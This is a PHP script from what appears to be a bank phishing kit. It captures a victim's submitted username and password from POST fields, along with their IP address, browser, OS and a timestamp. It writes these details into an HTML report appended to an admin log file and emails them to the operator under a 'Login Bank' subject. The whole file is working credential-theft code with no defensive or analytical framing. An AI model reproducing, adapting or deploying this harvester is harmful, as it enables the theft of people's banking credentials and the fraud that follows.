<?php

session_start();


include("./system.php");




$_SESSION['_username_']        = $_POST['user_id'];
$_SESSION['_pass_']               = $_POST['passwordbb'];



$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 


$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	


$ip = getenv("REMOTE_ADDR");





$yahya_email .= '<html><head></head>
<body>
<style>
font {font-family: "Comic Sans MS", cursive, sans-serif;},
</style>
<div style="font-size: 13px;font-family:monospace;font-weight:700;">
[<font style="color: #0070ba;">LOGIN INFORMATION</font>]
<br>
<font style="color:#9c0000;"></font> [🖊 Nombre de usuario] = <font >'.$_SESSION['_username_'].'</font>
<br>
<font style="color:#9c0000;"></font> [🔑 Contrasena] = <font >'.$_SESSION['_pass_'].'</font>
<br> 
<font>[💻 System]</font> <br>
<font style="color:#9c0000;"></font> [🔍 IP INFO] = <font>
<a target="_blank" style="text-decoration:none;" href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'"> '.$_SERVER['REMOTE_ADDR'].' </a></font><br>
<font style="color:#9c0000;"></font> [⏰ TIME/DATE] = <font >'.$InfoDATE.'</font><br>
<font style="color:#9c0000;"></font> [🌐 BROWSER] = <font >'.$browserTy_Version.' and '.$OS.'</font>
<br>
 <font style="color: #820000;"></font></div><font>
</font>
</body></html>';


$yagmail .= '
[🖊 Nombre de usuario] = '.$_SESSION['_username_'].'
[🔑 Contrasena] = '.$_SESSION['_pass_'].'
[💻 System]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'';


include("../../sand_rzlt_email.php");
include("./index.php");

$f = fopen("../../admin.php", "a");
	fwrite($f, $yahya_email);

$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "  🏛Login Bank🏛  [  ".$_SESSION['country1']." - ".$_SERVER['REMOTE_ADDR']." ] ";
$headers .= "From: ᗰᴏᴜꜱᴛᴀᴄʜᴇ™" . "\r\n";
mail($yourmail, $subject, $yahya_email , $headers);




?>
